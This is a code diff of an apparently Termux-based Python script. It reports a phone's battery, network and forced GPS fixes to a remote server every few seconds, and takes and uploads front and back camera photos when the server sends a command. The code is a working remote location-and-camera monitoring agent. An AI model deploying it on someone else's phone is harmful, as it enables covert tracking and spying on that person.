@@ -46,8 +46,30 @@ def obter_status_rede():
         except: pass
     return "Dados Moveis"
 
+def obter_gps_forcado():
+    """Força uma NOVA leitura do GPS a cada chamada"""
+    try:
+        # Mata qualquer processo de GPS pendente
+        run_command("pkill -f termux-location 2>/dev/null")
+        time.sleep(0.5)
+        
+        # Força uma nova consulta
+        resultado = run_command("termux-location -p gps -r once")
+        
+        if resultado:
+            dados = json.loads(resultado)
+            lat = dados.get("latitude")
+            lon = dados.get("longitude")
+            
+            # Só aceita valores válidos e diferentes de zero
+            if lat and lon and float(lat) != 0 and float(lon) != 0:
+                return float(lat), float(lon)
+    except:
+        pass
+    
+    return None, None
+
 def capturar_e_enviar_foto(tipo, numero_camera):
-    """Captura UMA foto e envia IMEDIATAMENTE"""
     if os.path.exists(ARQUIVO_FOTO):
         os.remove(ARQUIVO_FOTO)
     
@@ -61,12 +83,12 @@ def capturar_e_enviar_foto(tipo, numero_camera):
         payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": foto_b64}
         try:
             response = requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers_json, timeout=30)
-            if response.status_code == 200:
-                print(f"   ✅ {tipo} enviada!")
-                return True
+            return response.status_code == 200
         except:
             pass
     return False
+
+print("🛰️  INICIANDO MONITORAMENTO GPS...\n")
 
 # Loop principal
 while True:
@@ -81,21 +103,15 @@ while True:
             battery = str(bat_data.get("percentage", "N/A"))
         except: pass
     
-    # GPS
-    lat, lon = ultima_lat_valida, ultima_lon_valida
-    gps_atualizado = False
+    # GPS FORÇADO - Nova leitura a cada ciclo
+    lat_novo, lon_novo = obter_gps_forcado()
     
-    out_loc = run_command("termux-location -p gps -r once")
-    if out_loc:
-        try:
-            loc_data = json.loads(out_loc)
-            lat_novo = loc_data.get("latitude")
-            lon_novo = loc_data.get("longitude")
-            if lat_novo and lon_novo and lat_novo != 0 and lon_novo != 0:
-                lat, lon = lat_novo, lon_novo
-                ultima_lat_valida, ultima_lon_valida = lat, lon
-                gps_atualizado = True
-        except: pass
+    if lat_novo and lon_novo:
+        ultima_lat_valida = lat_novo
+        ultima_lon_valida = lon_novo
+        gps_ok = True
+    else:
+        gps_ok = False
     
     # UPTIME
     uptime = str(datetime.now() - inicio_operacao).split('.')[0]
@@ -103,14 +119,14 @@ while True:
     # REDE
     rede = obter_status_rede()
     
-    # PAYLOAD ENXUTO (sem velocidade)
     payload = {
         "device_id": DEVICE_ID,
         "battery": battery,
         "uptime": uptime,
-        "lat": lat,
-        "lon": lon,
+        "lat": ultima_lat_valida,
+        "lon": ultima_lon_valida,
         "network": rede,
+        "gps_ativo": gps_ok,
         "timestamp": timestamp_atual.isoformat()
     }
     
@@ -120,12 +136,15 @@ while True:
             res_data = response.json()
             comando_cam = str(res_data.get("comando_cam", "wait")).lower()
             
-            gps_icon = "📍" if gps_atualizado else "📡"
-            print(f"{gps_icon} [{timestamp_atual.strftime('%H:%M:%S')}] Bat:{battery}% {rede}")
+            gps_icon = "📍" if gps_ok else "📡"
+            print(f"{gps_icon} [{timestamp_atual.strftime('%H:%M:%S')}] Bat:{battery}% | {rede}")
+            if gps_ok:
+                print(f"   GPS: {ultima_lat_valida:.6f}, {ultima_lon_valida:.6f}")
+            else:
+                print(f"   GPS: Aguardando sinal...")
             
             if comando_cam == "take_dual":
                 print("📸 [DUAL] Capturando...")
-                # Envia UMA por vez (mais rápido)
                 ok1 = capturar_e_enviar_foto("back", 0)
                 time.sleep(0.5)
                 ok2 = capturar_e_enviar_foto("front", 1)
@@ -140,4 +159,4 @@ while True:
     except Exception as e:
         print(f"⚠️ {str(e)[:50]}")
     
-    time.sleep(3.0)
+    time.sleep(5.0)
